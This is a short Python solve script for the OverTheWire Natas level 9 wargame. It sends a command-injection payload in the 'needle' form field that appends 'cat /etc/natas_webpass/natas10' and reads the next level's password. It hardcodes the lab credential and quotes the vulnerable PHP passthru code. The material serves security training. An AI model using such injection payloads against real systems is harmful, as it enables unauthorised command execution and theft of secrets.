from pwn import *
import requests
import re
import html

username = "natas9"
password = "W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl"
url = "http://{}.natas.labs.overthewire.org".format(username)

log.progress("Getting the natas10 password, Hold on! ")
session = requests.session()
#web = session.get(url + "/index-source.html", auth = (username, password)).text
web = session.post(url, data = {"needle" : "needle;cat /etc/natas_webpass/natas10 #", "submit" : "submit"}, auth = (username, password)).text
#content = print(html.unescape(web))		#(cat /etc/natas_webpass/natas10 #)("#" at the end makes only the first one available)		
#print(web)
print("The password for natas10 is === " + re.findall("[A-Za-z0-9]{32}", web)[1])


'''

This vuln is called PHP command injection. Because that passthru runs commands so its dangerous. 

<?
$key = "";

if(array_key_exists("needle", $_REQUEST)) {
    $key = $_REQUEST["needle"];
}

if($key != "") {
    passthru("grep -i $key dictionary.txt");
}
?>
'''